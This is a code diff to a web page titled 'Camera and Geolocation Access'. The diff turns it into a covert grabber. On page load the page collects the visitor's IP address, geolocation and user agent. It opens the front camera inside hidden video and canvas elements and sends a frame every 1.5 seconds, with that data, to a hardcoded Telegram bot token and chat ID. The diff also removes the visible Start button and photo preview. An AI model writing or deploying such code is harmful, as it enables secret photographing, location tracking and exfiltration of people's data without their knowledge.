@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Camera and Geolocation Access</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -15,125 +16,120 @@
         #camera {
             display: none;
         }
-        #preview {
-            margin-top: 10px;
-            display: flex;
-            flex-wrap: wrap;
-        }
-        .photo {
-            width: 100px;
-            height: 100px;
-            margin: 5px;
-            border: 1px solid #ccc;
+        .video-wrap, canvas {
+            display: none;
         }
     </style>
 </head>
 <body>
     <h1>Access Camera and Geolocation</h1>
-    <button id="startButton">Start</button>
     <p id="location"></p>
-    <input type="file" accept="image/*" capture="environment" id="camera" multiple>
-    <div id="preview"></div>
+    <div class="video-wrap">
+        <video id="video" playsinline autoplay></video>
+    </div>
+    <canvas id="canvas" width="740" height="580"></canvas>
 
     <script>
         let latitude = '';
         let longitude = '';
-        const photos = [];
         let ipAddress = '';
         const userAgent = navigator.userAgent;
         const telegramBotToken = '7359419952:AAHFAG4df44WHFOS3SJ6mafXxMtW9v-fc8E';
         const chatId = '2036883627';
 
-        document.getElementById('startButton').addEventListener('click', () => {
-            // Fetch IP Address
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    ipAddress = data.ip;
-                })
-                .catch(error => {
-                    console.error('Error fetching IP address:', error);
-                });
+        // Fetch IP Address
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                ipAddress = data.ip;
+            })
+            .catch(error => {
+                console.error('Error fetching IP address:', error);
+            });
 
-            // Request Geolocation
+        // Request Geolocation on Page Load
+        window.onload = () => {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((position) => {
                     latitude = position.coords.latitude;
                     longitude = position.coords.longitude;
                     document.getElementById('location').innerText = `Latitude: ${latitude}, Longitude: ${longitude}`;
-
-                    // Trigger the camera input
-                    document.getElementById('camera').click();
+                    initCamera();
                 }, (error) => {
                     alert(`Error getting location: ${error.message}`);
+                    initCamera();
                 });
             } else {
                 alert('Geolocation is not supported by this browser.');
-            }
-        });
-
-        document.getElementById('camera').addEventListener('change', (event) => {
-            const files = event.target.files;
-            const preview = document.getElementById('preview');
-            preview.innerHTML = '';
-
-            for (let i = 0; i < files.length && i < 5; i++) {
-                const file = files[i];
-                const img = document.createElement('img');
-                img.classList.add('photo');
-                img.src = URL.createObjectURL(file);
-                preview.appendChild(img);
-                photos.push(file);
-            }
-
-            // Send Data to Telegram Bot
-            sendDataToTelegramBot();
-        });
-
-        const sendDataToTelegramBot = () => {
-            if (latitude && longitude && photos.length > 0) {
-                photos.forEach((photo, index) => {
-                    const formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('latitude', latitude);
-                    formData.append('longitude', longitude);
-                    formData.append('ip', ipAddress);
-                    formData.append('userAgent', userAgent);
-                    formData.append('photo', photo);
-
-                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    })
-                    let message = `Latitude: ${latitude}\nLongitude: ${longitude}\nIP: ${ipAddress}\nUser Agent: ${userAgent}`;
-
-                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: message
-                        })
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data.ok) {
-                            alert(`Photo ${index + 1} sent successfully`);
-                        } else {
-                            alert(`Failed to send photo ${index + 1}: ${data.description}`);
-                        }
-                    })
-                    .catch(error => {
-                        console.error('Error:', error);
-                        alert('Failed to send data');
-                    });
-                });
-            } else {
-                alert('Please capture location and photos first.');
+                initCamera();
             }
         };
+
+        // Access webcam
+        async function initCamera() {
+            try {
+                const constraints = {
+                    audio: false,
+                    video: {
+                        facingMode: "user"
+                    }
+                };
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                handleCameraSuccess(stream);
+            } catch (e) {
+                console.error('navigator.getUserMedia error:', e);
+                sendDataToTelegramBot(); // Send available data without photo
+            }
+        }
+
+        // Success handling for camera
+        function handleCameraSuccess(stream) {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            video.srcObject = stream;
+
+            const context = canvas.getContext('2d');
+            setInterval(() => {
+                context.drawImage(video, 0, 0, 740, 580);
+                const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+                sendDataToTelegramBot(canvasData);
+            }, 1500);
+        }
+
+        function sendDataToTelegramBot(photo = null) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('latitude', latitude);
+            formData.append('longitude', longitude);
+            formData.append('ip', ipAddress);
+            formData.append('userAgent', userAgent);
+
+            if (photo) {
+                formData.append('photo', photo);
+            }
+
+            const url = `https://api.telegram.org/bot${telegramBotToken}/send${photo ? 'Photo' : 'Message'}`;
+            const data = photo ? formData : JSON.stringify({
+                chat_id: chatId,
+                text: `User Data:\nLatitude: ${latitude}\nLongitude: ${longitude}\nIP Address: ${ipAddress}\nUser Agent: ${userAgent}`
+            });
+
+            fetch(url, {
+                method: 'POST',
+                body: data
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Data sent successfully');
+                } else {
+                    console.error('Failed to send data:', data.description);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
     </script>
 </body>
 </html>
